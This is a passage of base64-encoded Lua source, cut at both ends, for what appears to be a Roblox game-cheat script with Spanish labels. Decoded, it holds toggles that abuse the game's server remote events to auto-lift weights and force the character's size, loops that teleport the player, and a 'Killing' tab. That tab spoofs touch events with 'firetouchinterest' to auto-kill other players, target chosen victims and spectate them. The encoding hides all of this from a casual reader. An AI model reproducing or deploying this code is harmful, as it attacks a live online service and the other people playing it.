mQKICAgIGVuZAogICAgCiAgICB0YXNrLnNwYXduKGZ1bmN0aW9uKCkKICAgICAgICB3aGlsZSBfRy5BdXRvV2VpZ2h0IGRvCiAgICAgICAgICAgIGlmIG5vdCBfRy5BdXRvV2VpZ2h0IHRoZW4gYnJlYWsgZW5kCiAgICAgICAgICAgIGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyLm11c2NsZUV2ZW50OkZpcmVTZXJ2ZXIoInJlcCIpCiAgICAgICAgICAgIHRhc2sud2FpdCgwLjEpCiAgICAgICAgZW5kCiAgICBlbmQpCmVuZCwgIkxldmFudGEgcGVzYXMgYXV0b23Dg8KhdGljYW1lbnRlIikKCnJlYmlydGhUYWI6QWRkU3dpdGNoKCJBdXRvIFNpemUgMSIsIGZ1bmN0aW9uKGJvb2wpCiAgICBfRy5hdXRvU2l6ZUFjdGl2ZSA9IGJvb2wKICAgIAogICAgaWYgYm9vbCB0aGVuCiAgICAgICAgc3Bhd24oZnVuY3Rpb24oKQogICAgICAgICAgICB3aGlsZSBfRy5hdXRvU2l6ZUFjdGl2ZSBhbmQgd2FpdCgpIGRvCiAgICAgICAgICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlJlcGxpY2F0ZWRTdG9yYWdlIikuckV2ZW50cy5jaGFuZ2VTcGVlZFNpemVSZW1vdGU6SW52b2tlU2VydmVyKCJjaGFuZ2VTaXplIiwgMSkKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kKQogICAgZW5kCmVuZCwgIkVzdGFibGVjZSBlbCB0YW1hw4PGksOCwrFvIGRlbCBwZXJzb25hamUgYSAxIGNvbnRpbnVhbWVudGUiKQoKLS0vLyBBdXRvIFRlbGVwb3J0IFBvc2l0aW9uCmxvY2FsIHRhcmdldFBvc2l0aW9uID0gVmVjdG9yMy5uZXcoLTg3NDEuNTU5NTcwMzEyNSwgMTIxLjY4MDAwMDMwNTE3NTc4LCAtNTg1Ni45MTk5MjE4NzUpCgotLS8vIFRvZ2dsZSBWYXJpYWJsZQpfRy5hdXRvVGVsZXBvcnQgPSBmYWxzZQoKLS0vLyBUZWxlcG9ydCBGdW5jdGlvbgpsb2NhbCBmdW5jdGlvbiB0ZWxlcG9ydFBsYXllcigpCiAgICBsb2NhbCBjaGFyID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcgogICAgaWYgY2hhciBhbmQgY2hhcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpIHRoZW4KICAgICAgICBjaGFyLkh1bWFub2lkUm9vdFBhcnQuQ0ZyYW1lID0gQ0ZyYW1lLm5ldyh0YXJnZXRQb3NpdGlvbikKICAgIGVuZAplbmQKCmxvY2FsIGF1dG9UZWxlcG9ydFN3aXRjaCA9IHJlYmlydGhUYWI6QWRkU3dpdGNoKCJBdXRvIGtpbmciLCBmdW5jdGlvbihzdGF0ZSkKICAgIF9HLmF1dG9UZWxlcG9ydCA9IHN0YXRlCiAgICBpZiBzdGF0ZSB0aGVuCiAgICAgICAgdGFzay5zcGF3bihmdW5jdGlvbigpCiAgICAgICAgICAgIHdoaWxlIF9HLmF1dG9UZWxlcG9ydCBkbwogICAgICAgICAgICAgICAgdGVsZXBvcnRQbGF5ZXIoKQogICAgICAgICAgICAgICAgdGFzay53YWl0KDAuMDAxKQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQpCiAgICBlbmQKZW5kKQoKLS0vLyBFbmFibGVkIGJ5IGRlZmF1bHQKYXV0b1RlbGVwb3J0U3dpdGNoOlNldChmYWxzZSkKCmxvY2FsIHNlc3Npb25TdGFydFRpbWUgPSBvcy50aW1lKCkKbG9jYWwgc2Vzc2lvblN0YXJ0U3RyZW5ndGggPSAwCmxvY2FsIHNlc3Npb25TdGFydER1cmFiaWxpdHkgPSAwCmxvY2FsIHNlc3Npb25TdGFydEtpbGxzID0gMApsb2NhbCBzZXNzaW9uU3RhcnRSZWJpcnRocyA9IDAKbG9jYWwgc2Vzc2lvblN0YXJ0QnJhd2xzID0gMApsb2NhbCBoYXNTdGFydGVkVHJhY2tpbmcgPSBmYWxzZQoKbG9jYWwgS2lsbGVyID0gd2luZG93OkFkZFRhYigiS2lsbGluZyIpCgpsb2NhbCBQbGF5ZXJzID0gZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikKbG9jYWwgTG9jYWxQbGF5ZXIgPSBQbGF5ZXJzLkxvY2FsUGxheWVyCmxvY2FsIHBsYXllcldoaXRlbGlzdCA9IHt9CmxvY2FsIHRhcmdldFBsYXllck5hbWVzID0ge30KbG9jYWwgYXV0b0dvb2RLYXJtYSA9IGZhbHNlCmxvY2FsIGF1dG9CYWRLYXJtYSA9IGZhbHNlCmxvY2FsIGF1dG9LaWxsID0gZmFsc2UKbG9jYWwga2lsbFRhcmdldCA9IGZhbHNlCmxvY2FsIHNweWluZyA9IGZhbHNlCmxvY2FsIGF1dG9FcXVpcFB1bmNoID0gZmFsc2UKbG9jYWwgYXV0b1B1bmNoTm9BbmltID0gZmFsc2UKbG9jYWwgdGFyZ2V0RHJvcGRvd25JdGVtcyA9IHt9CmxvY2FsIGF2YWlsYWJsZVRhcmdldHMgPSB7fQoKS2lsbGVyOkFkZFN3aXRjaCgiQXV0byBHb29kIEthcm1hIiwgZnVuY3Rpb24oYm9vbCkKICAgIGF1dG9Hb29kS2FybWEgPSBib29sCiAgICB0YXNrLnNwYXduKGZ1bmN0aW9uKCkKICAgICAgICB3aGlsZSBhdXRvR29vZEthcm1hIGRvCiAgICAgICAgICAgIGxvY2FsIHBsYXllckNoYXIgPSBMb2NhbFBsYXllci5DaGFyYWN0ZXIKICAgICAgICAgICAgbG9jYWwgcmlnaHRIYW5kID0gcGxheWVyQ2hhciBhbmQgcGxheWVyQ2hhcjpGaW5kRmlyc3RDaGlsZCgiUmlnaHRIYW5kIikKICAgICAgICAgICAgbG9jYWwgbGVmdEhhbmQgPSBwbGF5ZXJDaGFyIGFuZCBwbGF5ZXJDaGFyOkZpbmRGaXJzdENoaWxkKCJMZWZ0SGFuZCIpCiAgICAgICAgICAgIGlmIHBsYXllckNoYXIgYW5kIHJpZ2h0SGFuZCBhbmQgbGVmdEhhbmQgdGhlbgogICAgICAgICAgICAgICAgZm9yIF8sIHRhcmdldCBpbiBpcGFpcnMoUGxheWVyczpHZXRQbGF5ZXJzKCkpIGRvCiAgICAgICAgICAgICAgICAgICAgaWYgdGFyZ2V0IH49IExvY2FsUGxheWVyIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgZXZpbEthcm1hID0gdGFyZ2V0OkZpbmRGaXJzdENoaWxkKCJldmlsS2FybWEiKQogICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBnb29kS2FybWEgPSB0YXJnZXQ6RmluZEZpcnN0Q2hpbGQoImdvb2RLYXJtYSIpCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIGV2aWxLYXJtYSBhbmQgZ29vZEthcm1hIGFuZCBldmlsS2FybWE6SXNBKCJJbnRWYWx1ZSIpIGFuZCBnb29kS2FybWE6SXNBKCJJbnRWYWx1ZSIpIGFuZCBldmlsS2FybWEuVmFsdWUgPiBnb29kS2FybWEuVmFsdWUgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgcm9vdFBhcnQgPSB0YXJnZXQuQ2hhcmFjdGVyIGFuZCB0YXJnZXQuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIHJvb3RQYXJ0IHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmaXJldG91Y2hpbnRlcmVzdChyaWdodEhhbmQsIHJvb3RQYXJ0LCAxKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZpcmV0b3VjaGludGVyZXN0KGxlZnRIYW5kLCByb290UGFydCwgMSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmaXJldG91Y2hpbnRlcmVzdChyaWdodEhhbmQsIHJvb3RQYXJ0LCAwKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZpcmV0b3VjaGludGVyZXN0KGxlZnRIYW5kLCByb290UGFydCwgMCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICAgICAgdGFzay53YWl0KDAuMDEpCiAgICAgICAgZW5kCiAgICBlbmQpCmVuZCkKCktpbGxlcjpBZGRTd2l0Y2goIkF1dG8gQmFkIEthcm1hIiwgZnVuY3Rpb24oYm9vbCkKICAgIGF1dG9CYWRLYXJtYSA9IGJvb2wKICAgIHRhc2suc3Bhd24oZnVuY3Rpb24oKQogICAgICAgIHdoaWxlIGF1dG9CYWRLYXJtYSBkbwogICAgICAgICAgICBsb2NhbCBwbGF5ZXJDaGFyID0gTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyCiAgICAgICAgICAgIGxvY2FsIHJpZ2h0SGFuZCA9IHBsYXllckNoYXIgYW5kIHBsYXllckNoYXI6RmluZEZpcnN0Q2hpbGQoIlJpZ2h0SGFuZCIpCiAgICAgICAgICAgIGxvY2FsIGxlZnRIYW5kID0gcGxheWVyQ2hhciBhbmQgcGxheWVyQ2hhcjpGaW5kRmlyc3RDaGlsZCgiTGVmdEhhbmQiKQogICAgICAgICAgICBpZiBwbGF5ZXJDaGFyIGFuZCByaWdodEhhbmQgYW5kIGxlZnRIYW5kIHRoZW4KICAgICAgICAgICAgICAgIGZvciBfLCB0YXJnZXQgaW4gaXBhaXJzKFBsYXllcnM6R2V0UGxheWVycygpKSBkbwogICAgICAgICAgICAgICAgICAgIGlmIHRhcmdldCB+PSBMb2NhbFBsYXllciB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIGV2aWxLYXJtYSA9IHRhcmdldDpGaW5kRmlyc3RDaGlsZCgiZXZpbEthcm1hIikKICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgZ29vZEthcm1hID0gdGFyZ2V0OkZpbmRGaXJzdENoaWxkKCJnb29kS2FybWEiKQogICAgICAgICAgICAgICAgICAgICAgICBpZiBldmlsS2FybWEgYW5kIGdvb2RLYXJtYSBhbmQgZXZpbEthcm1hOklzQSgiSW50VmFsdWUiKSBhbmQgZ29vZEthcm1hOklzQSgiSW50VmFsdWUiKSBhbmQgZ29vZEthcm1hLlZhbHVlID4gZXZpbEthcm1hLlZhbHVlIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIHJvb3RQYXJ0ID0gdGFyZ2V0LkNoYXJhY3RlciBhbmQgdGFyZ2V0LkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiByb290UGFydCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZmlyZXRvdWNoaW50ZXJlc3QocmlnaHRIYW5kLCByb290UGFydCwgMSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmaXJldG91Y2hpbnRlcmVzdChsZWZ0SGFuZCwgcm9vdFBhcnQsIDEpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZmlyZXRvdWNoaW50ZXJlc3QocmlnaHRIYW5kLCByb290UGFydCwgMCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmaXJldG91Y2hpbnRlcmVzdChsZWZ0SGFuZCwgcm9vdFBhcnQsIDApCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIHRhc2sud2FpdCgwLjAxKQogICAgICAgIGVuZAogICAgZW5kKQplbmQpCgpsb2NhbCBQbGF5ZXJzID0gZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikKbG9jYWwgTG9jYWxQbGF5ZXIgPSBQbGF5ZXJzLkxvY2FsUGxheWVyCmxvY2FsIGZyaWVuZFdoaXRlbGlzdEFjdGl2ZSA9IGZhbHNlCgpLaWxsZXI6QWRkU3dpdGNoKCJBdXRvIFdoaXRlbGlzdCBGcmllbmRzIiwgZnVuY3Rpb24oc3RhdGUpCiAgICBmcmllbmRXaGl0ZWxpc3RBY3RpdmUgPSBzdGF0ZQoKICAgIGlmIHN0YXRlIHRoZW4KICAgICAgICBmb3IgXywgcGxheWVyIGluIGlwYWlycyhQbGF5ZXJzOkdldFBsYXllcnMoKSkgZG8KICAgICAgICAgICAgaWYgcGxheWVyIH49IExvY2FsUGxheWVyIGFuZCBMb2NhbFBsYXllcjpJc0ZyaWVuZHNXaXRoKHBsYXllci5Vc2VySWQpIHRoZW4KICAgICAgICAgICAgICAgIHBsYXllcldoaXRlbGlzdFtwbGF5ZXIuTmFtZV0gPSB0cnVlCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAoKICAgICAgICBQbGF5ZXJzLlBsYXllckFkZGVkOkNvbm5lY3QoZnVuY3Rpb24ocGxheWVyKQogICAgICAgICAgICBpZiBmcmllbmRXaGl0ZWxpc3RBY3RpdmUgYW5kIHBsYXllciB+PSBMb2NhbFBsYXllciBhbmQgTG9jYWxQbGF5ZXI6SXNGcmllbmRzV2l0aChwbGF5ZXIuVXNlcklkKSB0aGVuCiAgICAgICAgICAgICAgICBwbGF5ZXJXaGl0ZWxpc3RbcGxheWVyLk5hbWVdID0gdHJ1ZQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQpCiAgICBlbHNlCiAgICAgICAgZm9yIG5hbWUgaW4gcGFpcnMocGxheWVyV2hpdGVsaXN0KSBkbwogICAgICAgICAgICBsb2NhbCBmcmllbmQgPSBQbGF5ZXJzOkZpbmRGaXJzdENoaWxkKG5hbWUpCiAgICAgICAgICAgIGlmIGZyaWVuZCBhbmQgTG9jYWxQbGF5ZXI6SXNGcmllbmRzV2l0aChmcmllbmQuVXNlcklkKSB0aGVuCiAgICAgICAgICAgICAgICBwbGF5ZXJXaGl0ZWxpc3RbbmFtZV0gPSBuaWwKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICBlbmQKZW5kKQoKS2lsbGVyOkFkZFRleHRCb3goIldoaXRlbGlzdCIsIGZ1bmN0aW9uKHRleHQpCiAgICBsb2NhbCB0YXJnZXQgPSBQbGF5ZXJzOkZpbmRGaXJzdENoaWxkKHRleHQpCiAgICBpZiB0YXJnZXQgdGhlbgogICAgICAgIHBsYXllcldoaXRlbGlzdFt0YXJnZXQuTmFtZV0gPSB0cnVlCiAgICBlbmQKZW5kKQoKS2lsbGVyOkFkZFRleHRCb3goIlVuV2hpdGVsaXN0IiwgZnVuY3Rpb24odGV4dCkKICAgIGxvY2FsIHRhcmdldCA9IFBsYXllcnM6RmluZEZpcnN0Q2hpbGQodGV4dCkKICAgIGlmIHRhcmdldCB0aGVuCiAgICAgICAgcGxheWVyV2hpdGVsaXN0W3RhcmdldC5OYW1lXSA9IG5pbAogICAgZW5kCmVuZCkKCktpbGxlcjpBZGRTd2l0Y2goIkF1dG8gS2lsbCIsIGZ1bmN0aW9uKGJvb2wpCiAgICBhdXRvS2lsbCA9IGJvb2wKCiAgICB0YXNrLnNwYXduKGZ1bmN0aW9uKCkKICAgICAgICB3aGlsZSBhdXRvS2lsbCBkbwogICAgICAgICAgICBsb2NhbCBjaGFyYWN0ZXIgPSBMb2NhbFBsYXllci5DaGFyYWN0ZXIgb3IgTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyQWRkZWQ6V2FpdCgpCiAgICAgICAgICAgIGxvY2FsIHJpZ2h0SGFuZCA9IGNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiUmlnaHRIYW5kIikKICAgICAgICAgICAgbG9jYWwgbGVmdEhhbmQgPSBjaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkxlZnRIYW5kIikKCiAgICAgICAgICAgIGxvY2FsIHB1bmNoID0gTG9jYWxQbGF5ZXIuQmFja3BhY2s6RmluZEZpcnN0Q2hpbGQoIlB1bmNoIikKICAgICAgICAgICAgaWYgcHVuY2ggYW5kIG5vdCBjaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIlB1bmNoIikgdGhlbgogICAgICAgICAgICAgICAgcHVuY2guUGFyZW50ID0gY2hhcmFjdGVyCiAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgaWYgcmlnaHRIYW5kIGFuZCBsZWZ0SGFuZCB0aGVuCiAgICAgICAgICAgICAgICBmb3IgXywgdGFyZ2V0IGluIGlwYWlycyhQbGF5ZXJzOkdldFBsYXllcnMoKSkgZG8KICAgICAgICAgICAgICAgICAgICBpZiB0YXJnZXQgfj0gTG9jYWxQbGF5ZXIgYW5kIG5vdCBwbGF5ZXJXaGl0ZWxpc3RbdGFyZ2V0Lk5hbWVdIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgdGFyZ2V0Q2hhciA9IHRhcmdldC5DaGFyYWN0ZXIKICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgcm9vdFBhcnQgPSB0YXJnZXRDaGFyIGFuZCB0YXJnZXRDaGFyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikKICAgICAgICAgICAgICAgICAgICAgICAgaWYgcm9vdFBhcnQgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgcGNhbGwoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZpcmV0b3VjaGludGVyZXN0KHJpZ2h0SGFuZCwgcm9vdFBhcnQsIDEpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZmlyZXRvdWNoaW50ZXJlc3QobGVmdEhhbmQsIHJvb3RQYXJ0LCAxKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZpcmV0b3VjaGludGVyZXN0KHJpZ2h0SGFuZCwgcm9vdFBhcnQsIDApCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZmlyZXRvdWNoaW50ZXJlc3QobGVmdEhhbmQsIHJvb3RQYXJ0LCAwKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kKQogICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKCiAgICAgICAgICAgIHRhc2sud2FpdCgwLjA1KQogICAgICAgIGVuZAogICAgZW5kKQplbmQpCmxvY2FsIHRhcmdldERyb3Bkb3duID0gS2lsbGVyOkFkZERyb3Bkb3duKCJTZWxlY3QgVGFyZ2V0IiwgZnVuY3Rpb24obmFtZSkKICAgIGlmIG5hbWUgYW5kIG5vdCB0YWJsZS5maW5kKHRhcmdldFBsYXllck5hbWVzLCBuYW1lKSB0aGVuCiAgICAgICAgdGFibGUuaW5zZXJ0KHRhcmdldFBsYXllck5hbWVzLCBuYW1lKQogICAgZW5kCmVuZCkKCktpbGxlcjpBZGRCdXR0b24oIlJlbW92ZSBUYXJnZXQiLCBmdW5jdGlvbihuYW1lKQogICAgZm9yIGksIHYgaW4gaXBhaXJzKHRhcmdldFBsYXllck5hbWVzKSBkbwogICAgICAgIGlmIHYgPT0gbmFtZSB0aGVuCiAgICAgICAgICAgIHRhYmxlLnJlbW92ZSh0YXJnZXRQbGF5ZXJOYW1lcywgaSkKICAgICAgICAgICAgYnJlYWsKICAgICAgICBlbmQKICAgIGVuZAplbmQpCgpmb3IgXywgcGxheWVyIGluIGlwYWlycyhQbGF5ZXJzOkdldFBsYXllcnMoKSkgZG8KICAgIGlmIHBsYXllciB+PSBMb2NhbFBsYXllciB0aGVuCiAgICAgICAgdGFyZ2V0RHJvcGRvd246QWRkKHBsYXllci5OYW1lKQogICAgICAgIHRhcmdldERyb3Bkb3duSXRlbXNbcGxheWVyLk5hbWVdID0gdHJ1ZQogICAgZW5kCmVuZAoKUGxheWVycy5QbGF5ZXJBZGRlZDpDb25uZWN0KGZ1bmN0aW9uKHBsYXllcikKICAgIGlmIHBsYXllciB+PSBMb2NhbFBsYXllciB0aGVuCiAgICAgICAgdGFyZ2V0RHJvcGRvd246QWRkKHBsYXllci5OYW1lKQogICAgICAgIHRhcmdldERyb3Bkb3duSXRlbXNbcGxheWVyLk5hbWVdID0gdHJ1ZQogICAgZW5kCmVuZCkKClBsYXllcnMuUGxheWVyUmVtb3Zpbmc6Q29ubmVjdChmdW5jdGlvbihwbGF5ZXIpCiAgICBpZiB0YXJnZXREcm9wZG93bkl0ZW1zW3BsYXllci5OYW1lXSB0aGVuCiAgICAgICAgdGFyZ2V0RHJvcGRvd25JdGVtc1twbGF5ZXIuTmFtZV0gPSBuaWwKICAgICAgICB0YXJnZXREcm9wZG93bjpDbGVhcigpCiAgICAgICAgZm9yIG5hbWUgaW4gcGFpcnModGFyZ2V0RHJvcGRvd25JdGVtcykgZG8KICAgICAgICAgICAgdGFyZ2V0RHJvcGRvd246QWRkKG5hbWUpCiAgICAgICAgZW5kCiAgICBlbmQKCiAgICBmb3IgaSA9ICN0YXJnZXRQbGF5ZXJOYW1lcywgMSwgLTEgZG8KICAgICAgICBpZiB0YXJnZXRQbGF5ZXJOYW1lc1tpXSA9PSBwbGF5ZXIuTmFtZSB0aGVuCiAgICAgICAgICAgIHRhYmxlLnJlbW92ZSh0YXJnZXRQbGF5ZXJOYW1lcywgaSkKICAgICAgICBlbmQKICAgIGVuZAplbmQpCgpLaWxsZXI6QWRkU3dpdGNoKCJTdGFydCBLaWxsIFRhcmdldCIsIGZ1bmN0aW9uKHN0YXRlKQogICAga2lsbFRhcmdldCA9IHN0YXRlCgogICAgdGFzay5zcGF3bihmdW5jdGlvbigpCiAgICAgICAgd2hpbGUga2lsbFRhcmdldCBkbwogICAgICAgICAgICBsb2NhbCBjaGFyYWN0ZXIgPSBMb2NhbFBsYXllci5DaGFyYWN0ZXIgb3IgTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyQWRkZWQ6V2FpdCgpCgogICAgICAgICAgICBsb2NhbCBwdW5jaCA9IExvY2FsUGxheWVyLkJhY2twYWNrOkZpbmRGaXJzdENoaWxkKCJQdW5jaCIpCiAgICAgICAgICAgIGlmIHB1bmNoIGFuZCBub3QgY2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJQdW5jaCIpIHRoZW4KICAgICAgICAgICAgICAgIHB1bmNoLlBhcmVudCA9IGNoYXJhY3RlcgogICAgICAgICAgICBlbmQKCiAgICAgICAgICAgIGxvY2FsIHJpZ2h0SGFuZCA9IGNoYXJhY3RlcjpXYWl0Rm9yQ2hpbGQoIlJpZ2h0SGFuZCIsIDUpCiAgICAgICAgICAgIGxvY2FsIGxlZnRIYW5kID0gY2hhcmFjdGVyOldhaXRGb3JDaGlsZCgiTGVmdEhhbmQiLCA1KQoKICAgICAgICAgICAgaWYgcmlnaHRIYW5kIGFuZCBsZWZ0SGFuZCB0aGVuCiAgICAgICAgICAgICAgICBmb3IgXywgbmFtZSBpbiBpcGFpcnModGFyZ2V0UGxheWVyTmFtZXMpIGRvCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgdGFyZ2V0ID0gUGxheWVyczpGaW5kRmlyc3RDaGlsZChuYW1lKQogICAgICAgICAgICAgICAgICAgIGlmIHRhcmdldCBhbmQgdGFyZ2V0IH49IExvY2FsUGxheWVyIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgcm9vdFBhcnQgPSB0YXJnZXQuQ2hhcmFjdGVyIGFuZCB0YXJnZXQuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikKICAgICAgICAgICAgICAgICAgICAgICAgaWYgcm9vdFBhcnQgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgcGNhbGwoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZpcmV0b3VjaGludGVyZXN0KHJpZ2h0SGFuZCwgcm9vdFBhcnQsIDEpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZmlyZXRvdWNoaW50ZXJlc3QobGVmdEhhbmQsIHJvb3RQYXJ0LCAxKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZpcmV0b3VjaGludGVyZXN0KHJpZ2h0SGFuZCwgcm9vdFBhcnQsIDApCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZmlyZXRvdWNoaW50ZXJlc3QobGVmdEhhbmQsIHJvb3RQYXJ0LCAwKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kKQogICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKCiAgICAgICAgICAgIHRhc2sud2FpdCgwLjA1KQogICAgICAgIGVuZAogICAgZW5kKQplbmQpCiAgICAgICAgICAgICAgICAgICAgICAKbG9jYWwgc3B5VGFyZ2V0RHJvcGRvd24gPSBLaWxsZXI6QWRkRHJvcGRvd24oIlNlbGVjdCBWaWV3IFRhcmdldCIsIGZ1bmN0aW9uKG5hbWUpCiAgICB0YXJnZXRQbGF5ZXJOYW1lID0gbmFtZQplbmQpCgpmb3IgXywgcGxheWVyIGluIGlwYWlycyhQbGF5ZXJzOkdldFBsYXllcnMoKSkgZG8KICAgIGlmIHBsYXllciB+PSBMb2NhbFBsYXllciB0aGVuCiAgICAgICAgc3B5VGFyZ2V0RHJvcGRvd246QWRkKHBsYXllci5OYW1lKQogICAgZW5kCmVuZAoKUGxheWVycy5QbGF5ZXJBZGRlZDpDb25uZWN0KGZ1bmN0aW9uKHBsYXllcikKICAgIGlmIHBsYXllciB+PSBMb2NhbFBsYXllciB0aGVuCiAgICAgICAgc3B5VGFyZ2V0RHJvcGRvd246QWRkKHBsYXllci5OYW1lKQogICAgZW5kCmVuZCkKClBsYXllcnMuUGxheWVyUmVtb3Zpbmc6Q29ubmVjdChmdW5jdGlvbihwbGF5ZXIpCiAgICBpZiBwbGF5ZXIgfj0gTG9jYWxQbGF5ZXIgdGhlbgogICAgICAgIHNweVRhcmdldERyb3Bkb3duOkNsZWFyKCkKICAgICAgICBmb3IgXywgcGxyIGluIGlwYWlycyhQbGF5ZXJzOkdldFBsYXllcnMoKSkgZG8KICAgICAgICAgICAgaWYgcGxyIH49IExvY2FsUGxheWVyIHRoZW4KICAgICAgICAgICAgICAgIHNweVRhcmdldERyb3Bkb3duOkFkZChwbHIuTmFtZSkKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICBlbmQKZW5kKQoKS2lsbGVyOkFkZFN3aXRjaCgiVmlldyBQbGF5ZXIiLCBmdW5jdGlvbihib29sKQogICAgc3B5aW5nID0gYm9vbAogICAgaWYgbm90IHNweWluZyB0aGVuCiAgICAgICAgbG9jYWwgY2FtID0gd29ya3NwYWNlLkN1cnJlbnRDYW1lcmEKICAgICAgICBjYW0uQ2FtZXJhU3ViamVjdCA9IExvY2FsUGxheWVyLkNoYXJhY3RlciBhbmQgTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZCIpIG9yIExvY2FsUGxheWVyCiAgICAgICAgcmV0dXJuCiAgICBlbmQKICAgIHRhc2suc3Bhd24oZnVuY3Rpb24oKQogICAgICAgIHdoaWxlIHNweWluZyBkbwogICAgICAgICAgICBsb2NhbCB0YXJnZXQgPSBQbGF5ZXJzOkZpbmRGaXJzdENoaWxkKHRhcmdldFBsYXllck5hbWUpCiAgICAgICAgICAgIGlmIHRhcmdldCBhbmQgdGFyZ2V0IH49IExvY2FsUGxheWVyIHRoZW4KICAgICAgICAgICAgICAgIGxvY2FsIGh1bWFub2lkID0gdGFyZ2V0LkNoYXJhY3RlciBhbmQgdGFyZ2V0LkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWQiKQogICAgICAgICAgICAgICAgaWYgaHVtYW5vaWQgdGhlbgogICAgICAgICAgICAgICAgICAgIHdvcmtzcGFjZS5DdXJyZW50Q2FtZXJhLkNhbWVyYVN1YmplY3QgPSBodW1hbm9pZAogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgICAgICB0YXNrLndhaXQoMC4xKQogICAgICAgIGVuZAogICAgZW5kKQplbmQpCgpsb2NhbCBidXR0b24gPSBLaWxsZXI6QWRkQnV0dG9uKCJSZW1vdmUgUHVuY2ggQW5pbSIsIGZ1bmN0aW9uKCkKICAgIGxvY2FsIGJsb2NrZWRBbmltYXRpb25zID0gewogICAgICAgIFsicmJ4YXNzZXRpZDovLzM2Mzg3MjkwNTMiXSA9IHRydWUsCiAgICAgICAgWyJyYnhhc3NldGlkOi8vMzYzODc2NzQyNyJdID0gdHJ1ZSwKICAgIH0KCiAgICBsb2NhbCBmdW5jdGlvbiBzZXR1cEFuaW1hdGlvbkJsb2NraW5nKCkKICAgICAgICBsb2NhbCBjaGFyID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcgogICAgICAgIGlmIG5vdCBjaGFyIG9yIG5vdCBjaGFyOkZpbmRGaXJzdENoaWxkKCJIdW